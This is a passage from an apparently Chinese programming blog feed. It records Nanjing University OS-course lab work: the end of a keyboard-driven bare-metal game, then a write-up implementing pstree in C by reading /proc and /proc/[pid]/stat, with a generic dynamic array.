class="string">&quot;mainargs = \&quot;&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(args); <span class="comment">// make run mainargs=xxx</span></span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;\&quot;\n&quot;</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  <span class="comment">//初始化方块</span></span><br><span class="line">  square_init();</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Press any key to see its key code...\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">while</span> (<span class="number">1</span>) &#123;</span><br><span class="line">    <span class="type">const</span> <span class="type">char</span> *key = print_key();</span><br><span class="line">  </span><br><span class="line"></span><br><span class="line">    <span class="comment">//方便肉眼观察</span></span><br><span class="line">    <span class="type">int</span> delta = <span class="number">262</span>;</span><br><span class="line">    <span class="keyword">while</span>(delta--) &#123;;&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(!<span class="built_in">strcmp</span>(key, <span class="string">&quot;W&quot;</span>)) &#123; move_up(); &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span>(!<span class="built_in">strcmp</span>(key, <span class="string">&quot;S&quot;</span>)) &#123; move_down(); &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span>(!<span class="built_in">strcmp</span>(key, <span class="string">&quot;A&quot;</span>)) &#123; move_left(); &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span>(!<span class="built_in">strcmp</span>(key, <span class="string">&quot;D&quot;</span>)) &#123; move_right(); &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span>(!<span class="built_in">strcmp</span>(key, <span class="string">&quot;J&quot;</span>)) &#123; figure_big(); &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span>(!<span class="built_in">strcmp</span>(key, <span class="string">&quot;K&quot;</span>)) &#123; figure_small(); &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span>(!<span class="built_in">strcmp</span>(key, <span class="string">&quot;ESCAPE&quot;</span>)) &#123; halt(<span class="number">0</span>); &#125;</span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><h4 id="游戏编译和链接"><a href="#游戏编译和链接" class="headerlink" title="游戏编译和链接"></a>游戏编译和链接</h4><p>  最后，我们在<strong>amgame</strong>路径下，执行如下命令，进行游戏的编译和运行<br>  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">make ARCH=x86_64-qemu run</span><br></pre></td></tr></table></figure></p><p>  游戏的运行结果如下所示<br>  <img src="游戏截图.PNG" alt="游戏截图"></p>]]></content>
      
      
      <categories>
          
          <category> 手写 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 手写 </tag>
            
            <tag> 操作系统 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>操作系统-设计与实现</title>
      <link href="/2021/07/24/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F-%E8%AE%BE%E8%AE%A1%E4%B8%8E%E5%AE%9E%E7%8E%B0/"/>
      <url>/2021/07/24/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F-%E8%AE%BE%E8%AE%A1%E4%B8%8E%E5%AE%9E%E7%8E%B0/</url>
      
        <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>  因为比较欠缺计算机基础知识，这里特别选取了南京大学蒋炎岩老师的<a href="http://jyywiki.cn/OS/2021/">《操作系统：设计与实现》</a>，从而从理论和实践两方面，补全操作系统相关的知识<br>  这些博客将简单记录重要的理论知识，以及全部的相关实验和实验心得，作为成长道路上的积累</p><h1 id="M1打印进程树"><a href="#M1打印进程树" class="headerlink" title="M1打印进程树"></a>M1打印进程树</h1><h2 id="实验背景"><a href="#实验背景" class="headerlink" title="实验背景"></a>实验背景</h2><p>  在Linux中，<strong>everything is a file</strong>。因此操作系统的状态也可以成为文件系统的一部分——在保持文件系统基本API没有变化的基础上，添加相关对象管理操作系统的状态信息。</p><h2 id="实验描述"><a href="#实验描述" class="headerlink" title="实验描述"></a>实验描述</h2><blockquote><p>实验要求：实现pstree，打印进程之间的树状的父子关系</p><blockquote><p>Linux系统中可以同时运行多个程序。运行的程序称为<strong>进程</strong>。除了所有进程的根外，每个进程都只有唯一的父进程，你的任务就是将这颗树在命令行中输出。你可以自由选择展示树的方式。</p></blockquote></blockquote><h3 id="总览"><a href="#总览" class="headerlink" title="总览"></a>总览</h3>  <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pstree [OPTION]...</span><br></pre></td></tr></table></figure><h3 id="描述"><a href="#描述" class="headerlink" title="描述"></a>描述</h3><p>  把系统中的进程按照父亲-孩子的树状结构打印到终端</p><ul><li>-p —show-pids:打印每个进程的进程号</li><li>-n —numeric-sort:按照pid的数值从小到大顺序输出一个进程的直接孩子</li><li><p>-V —version:打印版本信息</p><p>你可以在命令行中观察系统的<code>pstree</code>的执行行为。这些参数可能任意组合</p></li></ul><h3 id="解释"><a href="#解释" class="headerlink" title="解释"></a>解释</h3><p>  上述实验要求是参照man page的格式写出的，其中有很多UNIX命令行工具遵守的共同约定，部分如下所示:</p><ol><li>中括号括起来的参数是可选参数,[]后的…代表参数的0次或多次重复。因此-p、-n、-V都是可选的参数</li><li>同一个选项可以有不同的名字。在<code>pstree</code>中，-p和--show-pids的含义相同</li><li><p>若不另行说明，整数范围在32位有符号整数范围内；但如果数值和文件大小有关，则其合法的范围是0到系统最大支持的文件大小</p><p>此外，<code>main</code>函数的返回值代表了命令执行的状态，其中<code>EXIT_SUCCESS</code>表示命令执行成功，<code>EXIT_FAILURE</code>表示执行失败。对于<code>POSIX</code>来说，0表示成功，非0表示失败</p></li></ol><h2 id="实验指南"><a href="#实验指南" class="headerlink" title="实验指南"></a>实验指南</h2><p>  保持良好的模块化，既可以将复杂的问题分解为多个较为简单的问题并依次解决；亦方便进行调试和维护。整个实验实际上可以分为五部分：</p><ol><li>获取命令行参数，根据要求设置标志变量的数值</li><li>获取系统中所有进程的编号(每个进程都会有唯一编号)并保存至列表中</li><li>对列表中的每个编号，获取其父进程</li><li>在内存中将树创建好，并按照命令行参数要求排序</li><li>输出树到终端上</li></ol><h2 id="设置实验环境"><a href="#设置实验环境" class="headerlink" title="设置实验环境"></a>设置实验环境</h2><p>  首先安装相关的依赖文件<br>  <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">sudo</span> apt-get install qemu-system libsdl2-dev gcc-multilib</span><br></pre></td></tr></table></figure></p><p>  按照<a href="http://jyywiki.cn/OS/2021/labs/Labs">指导手册</a>中说明的，我们从github上拉取相关的实验<br>  <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com/NJU-ProjectN/os-workbench.git nju</span><br></pre></td></tr></table></figure></p><p>  之后在该目录下拉取相关的实验代码即可<br>  <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> nju</span><br><span class="line">git pull origin M1</span><br></pre></td></tr></table></figure></p><h2 id="实验实现"><a href="#实验实现" class="headerlink" title="实验实现"></a>实验实现</h2><p>  下面是个人的思路及其实现, <a href="https://gitee.com/jiaweihawk/nju-os/tree/f455881abd983028cf6f7b469f73dbc53ab1ace8">实验实现</a></p><h3 id="命令行参数"><a href="#命令行参数" class="headerlink" title="命令行参数"></a>命令行参数</h3><p>  获取命令行参数的话，就是<code>main</code>中的两个参数<code>int argc</code>和<code>char *argv[]</code>，其中<code>argc</code>表示参数的个数， <code>argv</code>存储具体参数<br>  我们在该部分一方面需要获取传递入的参数信息；另一方面，还需要对其进行简单的解析。这里简单说明一下思考情况及解析规则：</p><ol><li>可能重复出现多个程序参数，如<code>pstree -p --show-pids</code></li><li>可能出现多个不同的程序参数，如<code>pstree -p -n</code></li></ol><p>  根据观察系统<code>pstree</code>命令的表现，其应该具有如下规则：</p><ol><li>当命令行参数中包含<code>-V</code>或<code>--version</code>程序参数时，只输出对应的版本信息</li><li><p>依次解析后面的参数，并只需要标记一次即可</p><p>其代码实现如下所示</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * 如果解析到相关的字段，则完成赋值即可</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> true ((unsigned char)(1))</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> false ((unsigned char)(0))</span></span><br><span class="line"><span class="type">static</span> <span class="type">unsigned</span> <span class="type">char</span> show_pids = <span class="literal">false</span>, numeric_sort = <span class="literal">false</span>, show_version = <span class="literal">false</span>;</span><br><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">parse_arguements</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> *argv[])</span> &#123;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * 第一个是程序名称，因此不需要进行解析</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">1</span>; i &lt; argc; ++i) &#123;</span><br><span class="line">assert(argv[i]);</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * 可以使用hash表进行优化</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">if</span>(!<span class="built_in">strcmp</span>(argv[i], <span class="string">&quot;-p&quot;</span>) || !<span class="built_in">strcmp</span>(argv[i], <span class="string">&quot;--show-pids&quot;</span>)) &#123;</span><br><span class="line">show_pids = <span class="literal">true</span>;</span><br><span class="line">&#125;<span class="keyword">else</span> <span class="keyword">if</span>(!<span class="built_in">strcmp</span>(argv[i], <span class="string">&quot;-n&quot;</span>) || !<span class="built_in">strcmp</span>(argv[i], <span class="string">&quot;--numeric-sort&quot;</span>)) &#123;</span><br><span class="line">numeric_sort = <span class="literal">true</span>;</span><br><span class="line">&#125;<span class="keyword">else</span> <span class="keyword">if</span>(!<span class="built_in">strcmp</span>(argv[i], <span class="string">&quot;-V&quot;</span>) || !<span class="built_in">strcmp</span>(argv[i], <span class="string">&quot;--version&quot;</span>)) &#123;</span><br><span class="line">show_version = <span class="literal">true</span>;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;<span class="keyword">else</span> &#123;</span><br><span class="line">assert(<span class="literal">false</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">assert(!argv[argc]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ol><h3 id="系统进程编号"><a href="#系统进程编号" class="headerlink" title="系统进程编号"></a>系统进程编号</h3><p>  作为一个基础的知识，操作系统中每一个进程，都会有唯一的编号与其对应，在<strong>C</strong>语言中是<code>pid_t</code>类型。<br>  对于Linux操作系统来说，其提供了<strong>procfs(proc filesystem)</strong>机制来访问这些进程信息以及其他操作系统相关的信息，其目录为<strong>/proc</strong>。其目录下包括<code>cpuinfo</code>这样的文件，还有数字类型的文件夹，其记录了进程信息；而文件夹名称，也就是其进程号。<br>  这里我们调用Linux下libc中的标准库，进行目录的读取和判断即可，可以通过命令<code>man 3 opendir</code>、<code>man 3 readdir</code>和<code>man 3 closedir</code>查看相关的API信息，其基本步骤如下所示：</p><ol><li>调用<code>DIR *dir = opendir(&quot;/proc&quot;)</code>，打开<code>DIR*</code>结构，为后面的遍历做准备</li><li><p>调用<code>struct dirent *dirItem = readdir(dir)</code>，依次遍历<strong>/proc</strong>目录下的所有文件：</p><ul><li>如果<strong>dirItem == NULL</strong>，则表明遍历结束，此部分功能完成</li><li>否则，如果其文件名是数字，则为对应的进程子目录，将其目录名称进行统计即可</li></ul><p>这里统计进程信息时，就按照简单的数组进行填充即可。这里数组按照动态数组进行管理，即每当数组大小不够时，调用<code>calloc</code>扩充一倍大小即可</p><p>其代码实现如下所示</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;dirent.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * 这里存放当前所有的pid</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">static</span> <span class="type">pid_t</span>* pids = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">int</span> pids_capacity = <span class="number">0</span>, pids_number = <span class="number">0</span>;</span><br><span class="line"><span class="type">const</span> <span class="type">static</span> <span class="type">int</span> pids_initial_capacity = <span class="number">8</span>;</span><br><span class="line"><span class="type">const</span> <span class="type">static</span> <span class="type">char</span> *procfs_dir = <span class="string">&quot;/proc/&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * 如果是数字类型的子目录，则其为pid，返回pid的值</span></span><br><span class="line"><span class="comment"> * 如果不是，则返回-1</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">static</span> <span class="type">long</span> <span class="title function_">dirent_to_pid</span><span class="params">(<span class="keyword">struct</span> dirent *dirItem)</span> &#123;</span><br><span class="line">assert(dirItem);</span><br><span class="line"></span><br><span class="line"><span class="type">long</span> pid = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(dirItem-&gt;d_type == DT_DIR) &#123;</span><br><span class="line"><span class="type">char</span> *name = dirItem-&gt;d_name;</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; name[i]; ++i) &#123;</span><br><span class="line"><span class="keyword">if</span>(name[i] &gt; <span class="string">&#x27;9&#x27;</span> || name[i] &lt; <span class="string">&#x27;0&#x27;</span>) &#123; <span class="keyword">return</span> <span class="number">-1</span>; &#125;</span><br><span class="line">pid = pid * <span class="number">10</span> + name[i] - <span class="string">&#x27;0&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> pid;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * 动态插入pid</span></span><br><span class="line"><span class="comment"> * 如果大小不够了，调用realloc扩充一倍容量后继续插入</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">insert_pid</span><span class="params">(<span class="type">long</span> pid)</span> &#123;</span><br><span class="line">assert(pid &gt; <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">/*进行pids的初始化*/</span></span><br><span class="line"><span class="keyword">if</span>(pids == <span class="literal">NULL</span>) &#123;</span><br><span class="line">pids_capacity = pids_initial_capacity;</span><br><span class="line">pids_number = <span class="number">0</span>;</span><br><span class="line">pids = (<span class="type">pid_t</span>*)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(<span class="type">pid_t</span>) * pids_capacity);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*当pids容量不足时，进行扩充*/</span></span><br><span class="line"><span class="keyword">if</span>(pids_number == pids_capacity) &#123;</span><br><span class="line">pids_capacity *= <span class="number">2</span>;</span><br><span class="line">pids = <span class="built_in">realloc</span>(pids, <span class="keyword">sizeof</span>(<span class="type">pid_t</span>) * pids_capacity);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">assert(pids);</span><br><span class="line"></span><br><span class="line">pids[pids_number++] = (<span class="type">pid_t</span>)pid;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">get_pids</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *dirName)</span> &#123;</span><br><span class="line">DIR *dir = opendir(dirName);</span><br><span class="line">assert(dir != <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">dirent</span> *<span class="title">dirItem</span> =</span> <span class="literal">NULL</span>;</span><br><span class="line"><span class="keyword">while</span>((dirItem = readdir(dir)) != <span class="literal">NULL</span>) &#123;</span><br><span class="line"><span class="type">long</span> pid = dirent_to_pid(dirItem);</span><br><span class="line"><span class="keyword">if</span>(pid &gt; <span class="number">0</span>) &#123; insert_pid(pid); &#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ol><h3 id="系统进程关系"><a href="#系统进程关系" class="headerlink" title="系统进程关系"></a>系统进程关系</h3><p>  实际上，根据<code>man 5 proc</code>说明文档可以知道，在<strong>/proc/[pid]/stat</strong>文件中，描述了进程的相关信息，其第四个字符串表明了父进程的PID信息，因此我们只需要遍历一边前面得到的进程数组相关的<strong>stat</strong>文件，即可完成系统进程关系的获取。</p><p>  由于这是一棵树，所以其很稀疏，因此我们就使用邻接数组的结构来存储这张树即可，其邻接数组中元素仍然是一个动态数组。另一方面，由于其在获取关系时需要读取<strong>stat</strong>文件，因此可以同时获取进程所执行的命令信息，避免之后二次打开文件读取，造成性能损失。</p><p>  这个部分仅仅涉及简单的文件读取，其基本步骤如下所示：</p><ol><li>从小到大遍历前面获取的系统中的进程数组，根据进程<strong>pid</strong>，打开<strong>/proc/[pid]/stat</strong>文件</li><li>读取该文件的第2个字段值，即<strong>comm</strong>字段，为被截断在16个字符以内的执行命令信息</li><li><p>读取该文件的第4个字段值，即<strong>ppid</strong>字段，为进程的父进程pid。</p><ul><li>如果ppid为0，则该ppid不需要记录到关系中(因为默认根进程的pid为1)</li><li>如果ppid非0且已经在前面邻接数组中，则该进程为ppid的子进程，则向ppid的邻接数组中添加即可该子进程即可</li></ul><p>这里看到频繁使用了动态数组这一结构，因此将其提取出来，使用<strong>void/*</strong>来实现泛型编程，从而避免多次实现，其代码如下所示</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * 动态数组结构</span></span><br><span class="line"><span class="comment"> * 当number == capacity时，将其大小扩充一倍</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">ARRAY</span> &#123;</span></span><br><span class="line"><span class="type">void</span> *arr;</span><br><span class="line"><span class="type">long</span> <span class="type">int</span> size, capacity;</span><br><span class="line">&#125; Array;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> Array *__ARRAY_INIT(<span class="type">unsigned</span> <span class="type">int</span> type_size, <span class="type">unsigned</span> <span class="type">int</span> array_capacity) &#123;</span><br><span class="line">Array *<span class="built_in">array</span> = (Array*)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(Array));</span><br><span class="line">assert(<span class="built_in">array</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">array</span>-&gt;arr = <span class="built_in">malloc</span>(type_size * array_capacity);</span><br><span class="line">assert(<span class="built_in">array</span>-&gt;arr);</span><br><span class="line"></span><br><span class="line"><span class="built_in">array</span>-&gt;size = <span class="number">0</span>;</span><br><span class="line"><span class="built_in">array</span>-&gt;capacity = array_capacity;</span><br><span class="line"><span class="keyword">return</span> <span class="built_in">array</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">void</span> __ARRAY_INSERT(Array *<span class="built_in">array</span>, <span class="type">unsigned</span> <span class="type">int</span> type_size, <span class="type">void</span> *element) &#123;</span><br><span class="line">assert(<span class="built_in">array</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="built_in">array</span>-&gt;size == <span class="built_in">array</span>-&gt;capacity) &#123; </span><br><span class="line"><span class="built_in">array</span>-&gt;capacity *= <span class="number">2</span>;</span><br><span class="line"><span class="built_in">array</span>-&gt;arr = <span class="built_in">realloc</span>(<span class="built_in">array</span>-&gt;arr, type_size * <span class="built_in">array</span>-&gt;capacity);</span><br><span class="line">&#125;</span><br><span class="line">assert(<span class="built_in">array</span>-&gt;arr);</span><br><span class="line"></span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span> *src = (<span class="type">unsigned</span> <span class="type">char</span>*)element, *dst = ((<span class="type">unsigned</span> <span class="type">char</span>*)<span class="built_in">array</span>-&gt;arr) + type_size * (<span class="built_in">array</span>-&gt;size++);</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; type_size; ++i) &#123; dst[i] = src[i]; &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">#<span class="keyword">define</span> Array_Init(type, capacity) (__ARRAY_INIT(sizeof(type), (capacity)))</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> Array_Insert(type, array, element) (__ARRAY_INSERT((array), sizeof(type), (element)))</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> Array_Get(type, array, idx) ((type)(((type*)((array)-&gt;arr))[(idx)]))</span></span><br></pre></td></tr></table></figure><p>通过上述机制，可以传递变量类型，从而完成泛型编程。最终该部分的具体代码如下所示</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * 邻接数组的结构, 每一个节点表示一个待输出的进程</span></span><br><span class="line"><span class="comment"> * pid表示当前节点所表示的进程的id信息</span></span><br><span class="line"><span class="comment"> * comm表示当前节点所执行的命令名称</span></span><br><span class="line"><span class="comment"> * adj是动态数组，存放所有子进程在邻接数组中的id信息, Array(int)类型</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">PNODE</span> &#123;</span></span><br><span class="line"><span class="type">pid_t</span> pid;</span><br><span class="line"><span class="type">char</span> *comm;</span><br><span class="line">Array *son;</span><br><span class="line">&#125; Pnode;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * 其为Pnode*的动态数组</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">Array *pnodes = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * pnode是按照pid字段升序排列的</span></span><br><span class="line"><span class="comment"> * 使用二分查找，判断pid是否在pnode中</span></span><br><span class="line"><span class="comment"> * 如果不存在，返回-1</span></span><br><span class="line"><span class="comment"> * 如果存在，返回对应的下标</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">static</span> <span class="type">int</span> <span class="title function_">Search_Pnode</span><span class="params">(<span class="type">pid_t</span> pid)</span> &#123;</span><br><span class="line"><span class="keyword">if</span>(pnodes == <span class="literal">NULL</span>) &#123; <span class="keyword">return</span> <span class="number">-1</span>; &#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> left = <span class="number">0</span>, right = pnodes-&gt;size - <span class="number">1</span>;</span><br><span class="line"><span class="keyword">while</span>(left &lt;= right) &#123;</span><br><span class="line"><span class="type">int</span> middle = left + (right - left) / <span class="number">2</span>;</span><br><span class="line"><span class="keyword">if</span>(Array_Get(Pnode*, pnodes, middle)-&gt;pid == pid) &#123; <span class="keyword">return</span> middle; &#125;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span>(Array_Get(Pnode*, pnodes, middle)-&gt;pid &lt; pid) &#123; left = middle + <span class="number">1</span>; &#125;</span><br><span class="line"><span class="keyword">else</span> &#123; right = middle - <span class="number">1</span>; 